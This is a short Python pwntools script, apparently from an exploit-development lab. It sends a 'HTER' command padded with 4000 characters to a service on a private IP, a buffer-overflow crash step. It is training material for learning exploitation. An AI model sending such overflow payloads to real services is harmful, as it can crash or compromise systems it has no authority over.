#!/usr/bin/env python

from pwn import *

# target info
host = "192.168.145.128"
port = 9999

s = remote(host, port)

payload = b"".join([
    b"HTER ",
    b"1"*4000
])

s.send(payload)
s.interactive()